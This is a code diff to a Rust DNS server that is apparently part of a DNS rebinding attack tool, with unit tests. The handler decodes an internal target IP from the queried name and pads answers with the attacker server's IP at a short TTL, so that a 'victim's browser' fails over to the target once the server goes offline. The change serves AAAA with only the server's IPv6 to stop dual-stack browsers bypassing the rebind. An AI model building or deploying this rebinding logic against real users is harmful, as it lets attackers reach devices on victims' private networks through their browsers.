@@ -28,13 +28,18 @@
 //! # Server-IP injection
 //!
 //! The rebind name only needs to carry the **target** IP. Our own server's IP
-//! is known from config (`REBIND_SERVER_IP`), so the handler injects it into
-//! every answer that decoded a target (see [`answer_addrs`]): the server IP is
-//! always added once — the anchor the victim's browser lands on first — plus a
-//! configurable number of extra copies to bias browsers that prioritize the
-//! first record. `/stop` then takes the server offline and the browser fails
-//! over to the target. (Encoding the server IP in the name as a second label
-//! still works, but is no longer required.)
+//! is known from config (`REBIND_SERVER_IP`), so for an **A** query the handler
+//! injects it into every answer that decoded a target (see [`answer_addrs`]):
+//! the server IP is always added once — the anchor the victim's browser lands on
+//! first — plus a configurable number of extra copies to bias browsers that
+//! prioritize the first record. `/stop` then takes the server offline and the
+//! browser fails over to the target.
+//!
+//! **AAAA** queries are answered with *only* the configured server IPv6
+//! (`REBIND_SERVER_IP6`), a single record — the target is deliberately never
+//! exposed over IPv6. This keeps the rebind on the v4 path we control: a
+//! dual-stack browser can't quietly reach the target over IPv6 and skip the
+//! `/stop` timing. With no `REBIND_SERVER_IP6` configured, AAAA is NODATA.
 
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
 
@@ -55,10 +60,15 @@ pub struct RebindHandler {
     /// TTL placed on every answer. Rebinding wants a very short cache lifetime
     /// so the victim re-resolves quickly; 0 means "do not cache".
     pub ttl: u32,
-    /// Our own (standard) server's IP. When the active project's padding count
-    /// is > 0 this address is injected alongside the decoded target(s) so the
-    /// browser sees mostly *our* IP and only occasionally the target.
+    /// Our own (standard) server's IPv4 address, injected into **A** answers
+    /// alongside the decoded target(s) so the browser lands on us first (see
+    /// [`answer_addrs`]).
     pub server_ip: IpAddr,
+    /// Our own server's IPv6 address, if any. **AAAA** queries are answered with
+    /// *only* this single address — the target is never exposed over IPv6, so a
+    /// dual-stack browser can't reach the target on a v6 path that bypasses our
+    /// v4 rebind timing. When `None`, AAAA queries get an empty (NODATA) answer.
+    pub server_ip6: Option<Ipv6Addr>,
     /// The active project, read on every query for its `pad` count. Padding is
     /// a per-project setting (configurable from the dashboard's advanced
     /// settings), so the handler reads it live rather than capturing it at
@@ -100,11 +110,12 @@ impl RebindHandler {
         let qtype = query.query_type();
         tracing::info!("query {name} type={qtype}");
 
-        // Decode the matching addresses out of the name (random/base-domain
-        // labels are ignored) and pad with copies of our server IP. The pad
-        // count is read live from the active project.
+        // Build the answer. A queries decode the IPv4 target from the name and
+        // inject our server IPv4 (anchor + pad copies); AAAA queries return only
+        // our server IPv6, never the target. The pad count is read live from the
+        // active project.
         let pad = self.active.read().unwrap().pad_clamped();
-        let addrs = answer_addrs(&name, qtype, self.server_ip, pad);
+        let addrs = answer_addrs(&name, qtype, self.server_ip, self.server_ip6, pad);
 
         // Turn the addresses into answer records.
         let mut records: Vec<Record> = addrs
@@ -138,18 +149,22 @@ impl RebindHandler {
 
 /// Run the DNS server (UDP + TCP) on `bind` (e.g. `0.0.0.0:53`) forever.
 ///
-/// `server_ip` is our standard server's address; `active` is the shared active
-/// project, whose `pad` count controls how many extra copies of `server_ip` to
-/// inject next to each decoded target.
+/// `server_ip` is our standard server's IPv4 address (the anchor injected into A
+/// answers); `server_ip6` is the sole address returned for AAAA queries (or
+/// `None` for an empty AAAA answer). `active` is the shared active project,
+/// whose `pad` count controls how many extra copies of `server_ip` to inject
+/// next to each decoded target.
 pub async fn serve(
     bind: &str,
     ttl: u32,
     server_ip: IpAddr,
+    server_ip6: Option<Ipv6Addr>,
     active: Active,
 ) -> Result<(), Box<dyn std::error::Error>> {
     let handler = RebindHandler {
         ttl,
         server_ip,
+        server_ip6,
         active,
     };
     let mut server = ServerFuture::new(handler);
@@ -209,29 +224,36 @@ fn decode_addrs(name: &str, qtype: RecordType) -> Vec<IpAddr> {
     out
 }
 
-/// Build the full set of addresses to answer with: the target(s) decoded from
-/// `name`, plus copies of our own `server_ip`. The rebind name only carries the
-/// target IP — the server IP is known from config and injected here, so the
-/// browser lands on our server first and only fails over to the target once
-/// `/stop` takes us offline.
+/// Build the addresses to answer a query with, applying the rebind policy:
 ///
-/// When at least one target was decoded and `server_ip` matches the query type
-/// (A→IPv4, AAAA→IPv6), the server IP is always added once (the rebind anchor),
-/// plus `pad` extra copies to bias browsers that prioritize whichever record
-/// comes first. The caller shuffles the result so the copies interleave with
-/// the target rather than grouping at the end.
-fn answer_addrs(name: &str, qtype: RecordType, server_ip: IpAddr, pad: usize) -> Vec<IpAddr> {
-    let mut addrs = decode_addrs(name, qtype);
-    if !addrs.is_empty() {
-        let server_matches = matches!(
-            (server_ip, qtype),
-            (IpAddr::V4(_), RecordType::A) | (IpAddr::V6(_), RecordType::AAAA)
-        );
-        if server_matches {
-            addrs.extend(std::iter::repeat(server_ip).take(pad + 1));
+/// * **A** — decode the IPv4 target(s) from `name` (the rebind name carries only
+///   the target) and, when `server_ip` is itself IPv4, inject it once (the
+///   anchor the browser lands on first) plus `pad` extra copies to bias browsers
+///   that prioritize whichever record comes first. The caller shuffles the
+///   result so the copies interleave with the target. With no decoded target the
+///   answer is empty (nothing to rebind).
+/// * **AAAA** — return *only* `server_ip6` (a single record), or empty when it is
+///   `None`. The target is deliberately never exposed over IPv6, so a dual-stack
+///   browser can't reach it on a v6 path that bypasses our v4 rebind timing.
+/// * anything else — empty.
+fn answer_addrs(
+    name: &str,
+    qtype: RecordType,
+    server_ip: IpAddr,
+    server_ip6: Option<Ipv6Addr>,
+    pad: usize,
+) -> Vec<IpAddr> {
+    match qtype {
+        RecordType::A => {
+            let mut addrs = decode_addrs(name, RecordType::A);
+            if !addrs.is_empty() && matches!(server_ip, IpAddr::V4(_)) {
+                addrs.extend(std::iter::repeat(server_ip).take(pad + 1));
+            }
+            addrs
         }
+        RecordType::AAAA => server_ip6.map(|ip| vec![IpAddr::V6(ip)]).unwrap_or_default(),
+        _ => Vec::new(),
     }
-    addrs
 }
 
 /// Parse `a-b-c-d` (four decimal octets) into an IPv4 address.
@@ -351,6 +373,7 @@ mod tests {
     #[test]
     fn injects_server_ip_alongside_target() {
         let server: IpAddr = "203.0.113.5".parse().unwrap();
+        let server6: Ipv6Addr = "2001:db8::ffff".parse().unwrap();
         let target = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1));
         // The rebind name carries only the target; the server IP comes from
         // config.
@@ -358,29 +381,40 @@ mod tests {
 
         // pad=3 → target + the anchor server IP + 3 extra copies = 4 servers,
         // in decode/append order (the handler shuffles afterwards).
-        let out = answer_addrs(name, RecordType::A, server, 3);
+        let out = answer_addrs(name, RecordType::A, server, Some(server6), 3);
         assert_eq!(out, vec![target, server, server, server, server]);
         assert_eq!(out.iter().filter(|ip| **ip == server).count(), 4);
 
         // pad=0 → the server IP is still injected once (the rebind anchor).
-        assert_eq!(answer_addrs(name, RecordType::A, server, 0), vec![target, server]);
+        assert_eq!(
+            answer_addrs(name, RecordType::A, server, Some(server6), 0),
+            vec![target, server]
+        );
     }
 
     #[test]
-    fn no_injection_without_target_or_on_type_mismatch() {
+    fn a_query_without_target_is_empty() {
         let server_v4: IpAddr = "203.0.113.5".parse().unwrap();
-
         // No decoded target → nothing to rebind → empty answer (the server IP
         // is only injected alongside a target).
-        assert!(answer_addrs("example.com.", RecordType::A, server_v4, 3).is_empty());
+        assert!(answer_addrs("example.com.", RecordType::A, server_v4, None, 3).is_empty());
+    }
 
-        // IPv4 server IP can't anchor an AAAA answer (type mismatch); the IPv6
-        // target is returned alone.
-        let name = "2001-db8-z-1.example.com.";
+    #[test]
+    fn aaaa_returns_only_the_server_ipv6() {
+        let server_v4: IpAddr = "203.0.113.5".parse().unwrap();
+        let server6: Ipv6Addr = "2001:db8::ffff".parse().unwrap();
+
+        // AAAA queries return exactly the configured server IPv6 — never the
+        // target — regardless of any IPv6 label in the name or the pad count.
+        let name = "192-168-1-1.2001-db8-z-1.k3f9zq.example.com.";
         assert_eq!(
-            answer_addrs(name, RecordType::AAAA, server_v4, 3),
-            vec![IpAddr::V6("2001:db8::1".parse().unwrap())]
+            answer_addrs(name, RecordType::AAAA, server_v4, Some(server6), 5),
+            vec![IpAddr::V6(server6)]
         );
+
+        // With no server IPv6 configured, AAAA is an empty (NODATA) answer.
+        assert!(answer_addrs(name, RecordType::AAAA, server_v4, None, 5).is_empty());
     }
 
     #[test]
